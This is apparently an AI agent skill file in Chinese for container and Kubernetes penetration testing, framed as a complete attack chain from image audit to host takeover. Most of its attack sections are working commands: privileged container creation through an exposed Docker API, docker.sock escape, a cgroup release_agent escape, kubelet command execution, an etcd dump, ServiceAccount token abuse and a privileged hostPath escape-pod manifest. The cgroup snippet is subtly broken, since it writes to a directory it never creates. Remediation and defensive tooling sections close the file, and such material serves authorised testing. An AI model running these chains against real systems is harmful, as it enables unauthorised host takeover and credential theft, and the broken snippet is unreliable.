---
name: container-security-testing
description: 容器安全深度测试专业技能：Docker/K8s攻击面全覆盖、镜像漏洞利用、容器逃逸技术链、运行时攻击、供应链安全、从镜像审计到宿主机接管完整攻击链
version: 2.0.0
---

# 容器安全深度测试技能

## 概述

容器化是现代应用的基础架构，攻击面覆盖**镜像构建→运行时→网络→编排层→宿主机**全栈。本技能系统化覆盖**镜像审计→漏洞利用→容器逃逸→K8s横向→宿主机接管**完整攻击链。

## 一、镜像安全审计

### 1.1 镜像层分析
```bash
# 镜像层解包分析
docker save image:tag -o image.tar
tar -xf image.tar
# 逐层检查文件系统和变更

# 镜像漏洞扫描
trivy image target:latest
grype target:latest
clair-scanner --clair-url http://clair:6060 target:latest

# 敏感信息检测
docker history --no-trunc target:latest
dive target:latest  # 逐层分析

# Dockerfile安全审计检查项
# - FROM使用非root基础镜像
# - COPY vs ADD（ADD会自动解压+远程获取）
# - RUN链式命令减少层数
# - USER非root运行
# - HEALTHCHECK配置
# - .dockerignore覆盖敏感文件
```

### 1.2 镜像供应链攻击
```
攻击面：
1. 基础镜像投毒（Docker Hub恶意镜像）
2. 依赖包漏洞（CVE利用）
3. 构建环境泄露（.env/密钥/凭据）
4. Dockerfile注入（恶意RUN指令）
5. Registry凭证泄露（未认证push）
6. 签名绕过（Notary/Cosign绕过）
7. CI/CD管道注入（恶意Pipeline阶段）
```

## 二、Docker运行时攻击

### 2.1 Docker API未授权访问
```bash
# Docker Remote API暴露（2375/2376端口）
curl http://target:2375/containers/json
curl http://target:2375/version

# 利用Docker API创建特权容器
curl -X POST http://target:2375/containers/create -H "Content-Type: application/json" -d '{
  "Image": "alpine",
  "Cmd": ["/bin/sh"],
  "HostConfig": {
    "Privileged": true,
    "Binds": ["/:/host"]
  }
}'
curl -X POST http://target:2375/containers/{id}/start
```

### 2.2 Docker Socket暴露
```bash
# 容器内挂载docker.sock
ls -la /var/run/docker.sock

# 利用docker.sock逃逸
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host --net=host -v /:/mnt alpine chroot /mnt
```

## 三、容器逃逸技术

### 3.1 逃逸路径矩阵

| 逃逸方式 | 前提条件 | 影响 | 复杂度 |
|---------|---------|------|-------|
| 特权容器 | --privileged | 完全逃逸 | 低 |
| Docker Socket | 挂载/var/run/docker.sock | 完全逃逸 | 低 |
| 宿主机PID | --pid=host | nsenter逃逸 | 低 |
| 宿主机网络 | --net=host | 网络层逃逸 | 低 |
| CAP_SYS_ADMIN | --cap-add=SYS_ADMIN | mount逃逸 | 中 |
| 宿主机文件系统 | -v /:/host | 文件读写 | 低 |
| 内核漏洞 | 特定CVE | 内核级逃逸 | 高 |
| cgroup notify_on_release | --privileged | 逃逸 | 中 |

### 3.2 特权容器逃逸
```bash
# 直接访问宿主机设备
ls /dev/sda1  # 宿主机磁盘
mount /dev/sda1 /mnt  # 挂载宿主机文件系统
chroot /mnt  # 切换根目录到宿主机

# cgroup逃逸（写入release_agent）
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
echo 1 > /tmp/cgrp/child/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/child/cgroup.procs"
```

### 3.3 内核漏洞逃逸
```
已知内核漏洞：
- CVE-2022-0847 (DirtyPipe) → 任意文件覆盖 → Linux 5.8+
- CVE-2024-1086 → nf_tables UAF → Linux 5.14-6.6
- CVE-2022-0492 → cgroup逃逸 → Linux <5.16.11
- CVE-2020-15257 → containerd Shim API
- CVE-2019-5736 → runc容器逃逸
- CVE-2021-4034 → polkit本地提权
```

### 3.4 CAP_SYS_ADMIN逃逸
```bash
# 利用mount+nsenter
unshare -Urm
mount -t proc /proc /mnt/proc 2>/dev/null
# 利用mount namespace逃逸

# 利用release_agent
# 类似特权容器cgroup逃逸
```

## 四、Kubernetes安全测试

### 4.1 K8s攻击面

| 攻击面 | 风险 | 测试方法 |
|--------|------|---------|
| API Server | 未授权访问/认证绕过 | curl测试匿名访问 |
| etcd | 数据泄露 | 2379端口暴露检测 |
| Kubelet | 未授权API | 10250端口匿名访问 |
| ServiceAccount | Token泄露 | Pod内Token滥用 |
| RBAC | 过度权限 | can-i审计 |
| NetworkPolicy | 网络隔离缺失 | Pod间通信测试 |
| Admission Controller | 安全策略绕过 | PSP/OPA审计 |
| Ingress Controller | 请求劫持 | 配置审计 |

### 4.2 K8s渗透测试
```bash
# Kubelet未授权访问
curl -k https://node:10250/pods
curl -k https://node:10250/run/namespace/pod/container -d "cmd=id"

# etcd未授权访问
etcdctl --endpoints=https://etcd:2379 --insecure-skip-tls-verify get / --prefix --keys-only | head -20

# ServiceAccount Token利用
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
kubectl --token=$TOKEN --server=https://k8s-api:6443 --insecure-skip-tls-verify get pods -n kube-system

# RBAC审计
kubectl auth can-i --list
kubectl get clusterrolebindings -o json | jq '.items[] | select(.subjects[].name=="default")'

# 创建特权Pod逃逸
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
spec:
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh", "-c", "sleep infinity"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host
      mountPath: /host
  volumes:
  - name: host
    hostPath:
      path: /
  hostPID: true
  hostNetwork: true
EOF
```

### 4.3 K8s横向移动
```
1. 窃取高权限ServiceAccount Token
2. 创建恶意Pod/CronJob持久化
3. 利用NetworkPolicy缺失横向移动到其他Pod
4. 通过NodePort/LoadBalancer暴露内部服务
5. 利用Secret/ConfigMap获取凭据
6. 通过Admission Webhook拦截/修改请求
```

## 五、运行时安全

### 5.1 进程注入
```bash
# 容器内进程注入（ptrace）
# 需要CAP_SYS_PTRACE
nsenter --target PID --mount --uts --ipc --net --pid -- /bin/bash
```

### 5.2 内存马注入
```
# Java容器内存马
# 通过JNDI/反序列化注入Filter/Servlet/Listener内存马
# 无需写入文件，重启后消失

# 进程替换
# 替换容器内合法进程为恶意进程
```

## 六、工具链

```bash
# 镜像安全
trivy              # 镜像漏洞扫描
grype              # 漏洞数据库
dive               # 镜像层分析
dockle             # Dockerfile审计
hadolint           # Dockerfile Lint

# 运行时安全
falco              # 运行时威胁检测
sysdig             # 系统调用监控
tracee             # eBPF安全追踪

# K8s安全
kube-hunter        # K8s渗透测试
kubeaudit          # K8s审计
peirates           # K8s渗透工具集
kdigger            # K8s环境探测
kubescape          # K8s合规检查
checkov            # IaC安全扫描

# 容器逃逸
CDK                # 容器渗透工具集
BoopSuite          # 容器安全工具
```

## 七、测试检查清单

- [ ] 镜像漏洞扫描（CVE检测）
- [ ] 镜像敏感信息检测（密钥/凭据/Token）
- [ ] Dockerfile安全审计（非root/最小层数）
- [ ] Docker Daemon安全（API暴露/Socket权限）
- [ ] 容器运行时权限（非特权/CAP最小化）
- [ ] 容器逃逸测试（特权/PID/Socket/CAP）
- [ ] K8s API Server安全（认证/RBAC/Admission）
- [ ] K8s网络策略（NetworkPolicy覆盖）
- [ ] K8s Secret管理（etcd加密/Vault集成）
- [ ] 日志监控（Falco/Audit Log/CloudTrail）

## 八、修复建议

- **最小权限**：容器以非root运行，最小CAP集合
- **只读根文件系统**：`readOnlyRootFilesystem: true`
- **资源限制**：CPU/Memory limit，防DoS
- **网络隔离**：NetworkPolicy + ServiceMesh
- **镜像签名**：Cosign/Notary强制签名验证
- **Pod安全标准**：启用Pod Security Admission
- **Secret管理**：HashiCorp Vault / External Secrets Operator
- **运行时防护**：Falco/Sysdig实时监控
